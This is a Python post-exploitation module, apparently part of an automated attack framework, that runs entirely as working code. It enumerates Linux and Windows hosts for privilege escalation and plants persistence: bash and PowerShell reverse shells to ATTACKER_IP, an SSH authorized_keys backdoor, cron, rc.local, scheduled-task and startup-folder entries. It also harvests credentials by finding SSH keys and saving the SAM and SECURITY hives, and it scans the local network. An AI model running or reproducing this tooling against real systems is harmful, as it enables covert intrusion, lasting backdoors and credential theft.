#!/usr/bin/env python3
import subprocess
import os
import json
import requests
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

class PostExploitation:
    def __init__(self, target, logger):
        self.target = target
        self.logger = logger
        self.findings = {
            "privilege_escalation": {},
            "data_gathering": {},
            "persistence": {},
            "lateral_movement": {}
        }
        self.output_dir = f"reports/post_exploitation_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Load exploitation results
        self.exploit_results = self._load_exploitation_results()
        
        # Common privilege escalation tools
        self.privesc_tools = {
            "linux": [
                "linpeas.sh",
                "linux-exploit-suggester.sh",
                "linuxprivchecker.py",
                "unix-privesc-check.sh"
            ],
            "windows": [
                "winpeas.bat",
                "windows-exploit-suggester.py",
                "powerup.ps1",
                "seatbelt.exe"
            ]
        }

    def _load_exploitation_results(self):
        """Load results from exploitation stage"""
        try:
            exploit_dir = max([d for d in os.listdir("reports") if d.startswith("exploitation_")])
            with open(f"reports/{exploit_dir}/findings.json", 'r') as f:
                return json.load(f)
        except Exception as e:
            self.logger.error(f"Failed to load exploitation results: {str(e)}")
            return None

    def run(self):
        """Run all post-exploitation tasks"""
        self.logger.info("Starting Post-Exploitation phase...")
        
        # 1. Privilege Escalation
        self.logger.info("Attempting privilege escalation...")
        self.findings["privilege_escalation"] = self.privilege_escalation()
        
        # 2. Data Gathering
        self.logger.info("Gathering sensitive data...")
        self.findings["data_gathering"] = self.data_gathering()
        
        # 3. Establishing Persistence
        self.logger.info("Establishing persistence...")
        self.findings["persistence"] = self.establish_persistence()
        
        # 4. Lateral Movement Preparation
        self.logger.info("Preparing for lateral movement...")
        self.findings["lateral_movement"] = self.prepare_lateral_movement()
        
        # Save findings
        self._save_findings()
        
        return self.findings

    def _save_findings(self):
        """Save findings to JSON file"""
        output_file = f"{self.output_dir}/findings.json"
        with open(output_file, 'w') as f:
            json.dump(self.findings, f, indent=4)
        self.logger.info(f"Findings saved to {output_file}")

    def run_command(self, command, capture_output=True):
        """Run a system command and return the output"""
        try:
            if isinstance(command, list):
                result = subprocess.run(command, capture_output=capture_output, text=True)
            else:
                result = subprocess.run(command, capture_output=capture_output, text=True, shell=True)
                
            if result.returncode != 0:
                self.logger.error(f"Command failed: {result.stderr}")
                return None
                
            return result.stdout if capture_output else "Command executed successfully"
            
        except Exception as e:
            self.logger.error(f"Error executing command: {str(e)}")
            return None

    def privilege_escalation(self):
        """Perform privilege escalation attempts"""
        results = {}
        
        # 1. System Information Gathering
        self.logger.info("Gathering system information...")
        sys_info = self._gather_system_info()
        results["system_info"] = sys_info
        
        # 2. Kernel Exploits
        self.logger.info("Checking for kernel exploits...")
        kernel_exploits = self._check_kernel_exploits()
        results["kernel_exploits"] = kernel_exploits
        
        # 3. Service Exploits
        self.logger.info("Checking for service exploits...")
        service_exploits = self._check_service_exploits()
        results["service_exploits"] = service_exploits
        
        # 4. Misconfiguration Exploits
        self.logger.info("Checking for misconfigurations...")
        misconfig_exploits = self._check_misconfigurations()
        results["misconfig_exploits"] = misconfig_exploits
        
        return results

    def _gather_system_info(self):
        """Gather system information for privilege escalation"""
        info = {
            "os_info": {},
            "user_info": {},
            "process_info": {},
            "network_info": {}
        }
        
        # OS Information
        os_commands = {
            "linux": [
                "uname -a",
                "cat /etc/os-release",
                "cat /etc/issue",
                "hostnamectl"
            ],
            "windows": [
                "systeminfo",
                "ver",
                "wmic os get Caption,Version,OSArchitecture"
            ]
        }
        
        # User Information
        user_commands = {
            "linux": [
                "id",
                "whoami",
                "groups",
                "cat /etc/passwd",
                "cat /etc/group"
            ],
            "windows": [
                "whoami /all",
                "net user",
                "net localgroup administrators"
            ]
        }
        
        # Process Information
        process_commands = {
            "linux": [
                "ps aux",
                "ps -ef",
                "top -b -n 1"
            ],
            "windows": [
                "tasklist /v",
                "wmic process get name,executablepath,commandline"
            ]
        }
        
        # Network Information
        network_commands = {
            "linux": [
                "ifconfig",
                "ip addr",
                "netstat -tuln",
                "netstat -anp"
            ],
            "windows": [
                "ipconfig /all",
                "netstat -ano",
                "netstat -b"
            ]
        }
        
        # Execute commands based on OS type
        os_type = self._detect_os_type()
        if os_type:
            for cmd in os_commands.get(os_type, []):
                result = self.run_command(cmd)
                if result:
                    info["os_info"][cmd] = result
                    
            for cmd in user_commands.get(os_type, []):
                result = self.run_command(cmd)
                if result:
                    info["user_info"][cmd] = result
                    
            for cmd in process_commands.get(os_type, []):
                result = self.run_command(cmd)
                if result:
                    info["process_info"][cmd] = result
                    
            for cmd in network_commands.get(os_type, []):
                result = self.run_command(cmd)
                if result:
                    info["network_info"][cmd] = result
                    
        return info

    def _detect_os_type(self):
        """Detect the operating system type"""
        try:
            result = self.run_command("uname -a")
            if result:
                return "linux"
            result = self.run_command("ver")
            if result:
                return "windows"
        except:
            pass
        return None

    def _check_kernel_exploits(self):
        """Check for kernel exploits"""
        results = {}
        
        os_type = self._detect_os_type()
        if os_type:
            # Run appropriate privilege escalation tools
            for tool in self.privesc_tools.get(os_type, []):
                self.logger.info(f"Running {tool}...")
                if os_type == "linux":
                    cmd = f"chmod +x {tool} && ./{tool}"
                else:
                    cmd = f"{tool}"
                result = self.run_command(cmd)
                if result:
                    results[tool] = result
                    
        return results

    def _check_service_exploits(self):
        """Check for service-based privilege escalation"""
        results = {}
        
        os_type = self._detect_os_type()
        if os_type:
            if os_type == "linux":
                # Check for SUID binaries
                suid_cmd = "find / -perm -4000 -type f -exec ls -la {} \\; 2>/dev/null"
                suid_result = self.run_command(suid_cmd)
                if suid_result:
                    results["suid_binaries"] = suid_result
                    
                # Check for world-writable files
                writable_cmd = "find / -perm -2 -type f -not -path \"/proc/*\" -exec ls -la {} \\; 2>/dev/null"
                writable_result = self.run_command(writable_cmd)
                if writable_result:
                    results["world_writable_files"] = writable_result
                    
            elif os_type == "windows":
                # Check for unquoted service paths
                service_cmd = "wmic service get name,pathname"
                service_result = self.run_command(service_cmd)
                if service_result:
                    results["service_paths"] = service_result
                    
                # Check for weak service permissions
                perm_cmd = "sc qc * | findstr BINARY_PATH_NAME"
                perm_result = self.run_command(perm_cmd)
                if perm_result:
                    results["service_permissions"] = perm_result
                    
        return results

    def _check_misconfigurations(self):
        """Check for misconfigurations that could lead to privilege escalation"""
        results = {}
        
        os_type = self._detect_os_type()
        if os_type:
            if os_type == "linux":
                # Check sudo configuration
                sudo_cmd = "sudo -l"
                sudo_result = self.run_command(sudo_cmd)
                if sudo_result:
                    results["sudo_config"] = sudo_result
                    
                # Check cron jobs
                cron_cmd = "ls -la /etc/cron*"
                cron_result = self.run_command(cron_cmd)
                if cron_result:
                    results["cron_jobs"] = cron_result
                    
            elif os_type == "windows":
                # Check scheduled tasks
                task_cmd = "schtasks /query /fo LIST /v"
                task_result = self.run_command(task_cmd)
                if task_result:
                    results["scheduled_tasks"] = task_result
                    
                # Check startup programs
                startup_cmd = "wmic startup list full"
                startup_result = self.run_command(startup_cmd)
                if startup_result:
                    results["startup_programs"] = startup_result
                    
        return results

    def data_gathering(self):
        """Gather sensitive data from the system"""
        results = {}
        
        # 1. User Data
        self.logger.info("Gathering user data...")
        user_data = self._gather_user_data()
        results["user_data"] = user_data
        
        # 2. System Data
        self.logger.info("Gathering system data...")
        system_data = self._gather_system_data()
        results["system_data"] = system_data
        
        # 3. Network Data
        self.logger.info("Gathering network data...")
        network_data = self._gather_network_data()
        results["network_data"] = network_data
        
        # 4. Application Data
        self.logger.info("Gathering application data...")
        app_data = self._gather_application_data()
        results["application_data"] = app_data
        
        return results

    def _gather_user_data(self):
        """Gather user-related data"""
        data = {}
        
        os_type = self._detect_os_type()
        if os_type:
            if os_type == "linux":
                # User files
                user_files_cmd = "find /home -type f -name '.*' -o -name '*.txt' -o -name '*.log' 2>/dev/null"
                user_files = self.run_command(user_files_cmd)
                if user_files:
                    data["user_files"] = user_files
                    
                # User history
                history_cmd = "find /home -name .bash_history -o -name .zsh_history 2>/dev/null"
                history = self.run_command(history_cmd)
                if history:
                    data["user_history"] = history
                    
            elif os_type == "windows":
                # User profiles
                profiles_cmd = "dir C:\\Users"
                profiles = self.run_command(profiles_cmd)
                if profiles:
                    data["user_profiles"] = profiles
                    
                # Recent files
                recent_cmd = "dir C:\\Users\\*\\Recent"
                recent = self.run_command(recent_cmd)
                if recent:
                    data["recent_files"] = recent
                    
        return data

    def _gather_system_data(self):
        """Gather system-related data"""
        data = {}
        
        os_type = self._detect_os_type()
        if os_type:
            if os_type == "linux":
                # System logs
                logs_cmd = "ls -la /var/log/"
                logs = self.run_command(logs_cmd)
                if logs:
                    data["system_logs"] = logs
                    
                # Configuration files
                config_cmd = "find /etc -type f -name '*.conf' -o -name '*.config' 2>/dev/null"
                config = self.run_command(config_cmd)
                if config:
                    data["config_files"] = config
                    
            elif os_type == "windows":
                # Event logs
                event_cmd = "wevtutil qe System /c:5"
                event = self.run_command(event_cmd)
                if event:
                    data["event_logs"] = event
                    
                # Registry
                reg_cmd = "reg query HKLM\\SOFTWARE"
                reg = self.run_command(reg_cmd)
                if reg:
                    data["registry"] = reg
                    
        return data

    def _gather_network_data(self):
        """Gather network-related data"""
        data = {}
        
        os_type = self._detect_os_type()
        if os_type:
            if os_type == "linux":
                # Network interfaces
                ifconfig_cmd = "ifconfig -a"
                ifconfig = self.run_command(ifconfig_cmd)
                if ifconfig:
                    data["network_interfaces"] = ifconfig
                    
                # Routing table
                route_cmd = "netstat -rn"
                route = self.run_command(route_cmd)
                if route:
                    data["routing_table"] = route
                    
            elif os_type == "windows":
                # Network interfaces
                ipconfig_cmd = "ipconfig /all"
                ipconfig = self.run_command(ipconfig_cmd)
                if ipconfig:
                    data["network_interfaces"] = ipconfig
                    
                # Routing table
                route_cmd = "route print"
                route = self.run_command(route_cmd)
                if route:
                    data["routing_table"] = route
                    
        return data

    def _gather_application_data(self):
        """Gather application-related data"""
        data = {}
        
        os_type = self._detect_os_type()
        if os_type:
            if os_type == "linux":
                # Installed packages
                packages_cmd = "dpkg -l"
                packages = self.run_command(packages_cmd)
                if packages:
                    data["installed_packages"] = packages
                    
                # Running services
                services_cmd = "systemctl list-units --type=service"
                services = self.run_command(services_cmd)
                if services:
                    data["running_services"] = services
                    
            elif os_type == "windows":
                # Installed programs
                programs_cmd = "wmic product get name,version"
                programs = self.run_command(programs_cmd)
                if programs:
                    data["installed_programs"] = programs
                    
                # Running services
                services_cmd = "net start"
                services = self.run_command(services_cmd)
                if services:
                    data["running_services"] = services
                    
        return data

    def establish_persistence(self):
        """Establish persistence on the system"""
        results = {}
        
        # 1. Backdoor Creation
        self.logger.info("Creating backdoors...")
        backdoors = self._create_backdoors()
        results["backdoors"] = backdoors
        
        # 2. Scheduled Tasks
        self.logger.info("Setting up scheduled tasks...")
        scheduled_tasks = self._setup_scheduled_tasks()
        results["scheduled_tasks"] = scheduled_tasks
        
        # 3. Startup Persistence
        self.logger.info("Setting up startup persistence...")
        startup_persistence = self._setup_startup_persistence()
        results["startup_persistence"] = startup_persistence
        
        return results

    def _create_backdoors(self):
        """Create backdoors for persistence"""
        backdoors = {}
        
        os_type = self._detect_os_type()
        if os_type:
            if os_type == "linux":
                # Create reverse shell
                shell_cmd = "echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /tmp/shell.sh"
                shell = self.run_command(shell_cmd)
                if shell:
                    backdoors["reverse_shell"] = shell
                    
                # Create SSH backdoor
                ssh_cmd = "echo 'ssh-rsa BACKDOOR_KEY' >> ~/.ssh/authorized_keys"
                ssh = self.run_command(ssh_cmd)
                if ssh:
                    backdoors["ssh_backdoor"] = ssh
                    
            elif os_type == "windows":
                # Create PowerShell backdoor
                ps_cmd = "echo '$client = New-Object System.Net.Sockets.TCPClient(\"ATTACKER_IP\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' > backdoor.ps1"
                ps = self.run_command(ps_cmd)
                if ps:
                    backdoors["powershell_backdoor"] = ps
                    
        return backdoors

    def _setup_scheduled_tasks(self):
        """Set up scheduled tasks for persistence"""
        tasks = {}
        
        os_type = self._detect_os_type()
        if os_type:
            if os_type == "linux":
                # Add cron job
                cron_cmd = "echo '* * * * * /tmp/shell.sh' >> /etc/crontab"
                cron = self.run_command(cron_cmd)
                if cron:
                    tasks["cron_job"] = cron
                    
            elif os_type == "windows":
                # Add scheduled task
                task_cmd = "schtasks /create /tn \"Update\" /tr \"C:\\backdoor.ps1\" /sc onlogon /ru System"
                task = self.run_command(task_cmd)
                if task:
                    tasks["scheduled_task"] = task
                    
        return tasks

    def _setup_startup_persistence(self):
        """Set up startup persistence"""
        persistence = {}
        
        os_type = self._detect_os_type()
        if os_type:
            if os_type == "linux":
                # Add to rc.local
                rc_cmd = "echo '/tmp/shell.sh &' >> /etc/rc.local"
                rc = self.run_command(rc_cmd)
                if rc:
                    persistence["rc_local"] = rc
                    
            elif os_type == "windows":
                # Add to startup folder
                startup_cmd = "copy backdoor.ps1 \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\""
                startup = self.run_command(startup_cmd)
                if startup:
                    persistence["startup_folder"] = startup
                    
        return persistence

    def prepare_lateral_movement(self):
        """Prepare for lateral movement"""
        results = {}
        
        # 1. Network Discovery
        self.logger.info("Discovering network...")
        network_discovery = self._discover_network()
        results["network_discovery"] = network_discovery
        
        # 2. Credential Harvesting
        self.logger.info("Harvesting credentials...")
        credentials = self._harvest_credentials()
        results["credentials"] = credentials
        
        # 3. Share Enumeration
        self.logger.info("Enumerating shares...")
        shares = self._enumerate_shares()
        results["shares"] = shares
        
        return results

    def _discover_network(self):
        """Discover network for lateral movement"""
        discovery = {}
        
        os_type = self._detect_os_type()
        if os_type:
            if os_type == "linux":
                # Network scan
                scan_cmd = "nmap -sn 192.168.1.0/24"
                scan = self.run_command(scan_cmd)
                if scan:
                    discovery["network_scan"] = scan
                    
                # ARP scan
                arp_cmd = "arp -a"
                arp = self.run_command(arp_cmd)
                if arp:
                    discovery["arp_table"] = arp
                    
            elif os_type == "windows":
                # Network scan
                scan_cmd = "for /L %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i | find \"TTL=\""
                scan = self.run_command(scan_cmd)
                if scan:
                    discovery["network_scan"] = scan
                    
                # ARP scan
                arp_cmd = "arp -a"
                arp = self.run_command(arp_cmd)
                if arp:
                    discovery["arp_table"] = arp
                    
        return discovery

    def _harvest_credentials(self):
        """Harvest credentials for lateral movement"""
        credentials = {}
        
        os_type = self._detect_os_type()
        if os_type:
            if os_type == "linux":
                # Check for password files
                passwd_cmd = "find / -name \"*.pwd\" -o -name \"*.pass\" 2>/dev/null"
                passwd = self.run_command(passwd_cmd)
                if passwd:
                    credentials["password_files"] = passwd
                    
                # Check for SSH keys
                ssh_cmd = "find / -name \"id_rsa\" -o -name \"id_dsa\" 2>/dev/null"
                ssh = self.run_command(ssh_cmd)
                if ssh:
                    credentials["ssh_keys"] = ssh
                    
            elif os_type == "windows":
                # Dump SAM
                sam_cmd = "reg save HKLM\\SAM sam.save /y"
                sam = self.run_command(sam_cmd)
                if sam:
                    credentials["sam_dump"] = sam
                    
                # Dump LSA secrets
                lsa_cmd = "reg save HKLM\\SECURITY security.save /y"
                lsa = self.run_command(lsa_cmd)
                if lsa:
                    credentials["lsa_secrets"] = lsa
                    
        return credentials

    def _enumerate_shares(self):
        """Enumerate shares for lateral movement"""
        shares = {}
        
        os_type = self._detect_os_type()
        if os_type:
            if os_type == "linux":
                # SMB shares
                smb_cmd = "smbclient -L //localhost"
                smb = self.run_command(smb_cmd)
                if smb:
                    shares["smb_shares"] = smb
                    
                # NFS shares
                nfs_cmd = "showmount -e localhost"
                nfs = self.run_command(nfs_cmd)
                if nfs:
                    shares["nfs_shares"] = nfs
                    
            elif os_type == "windows":
                # Network shares
                share_cmd = "net share"
                share = self.run_command(share_cmd)
                if share:
                    shares["network_shares"] = share
                    
                # Mapped drives
                drive_cmd = "net use"
                drive = self.run_command(drive_cmd)
                if drive:
                    shares["mapped_drives"] = drive
                    
        return shares 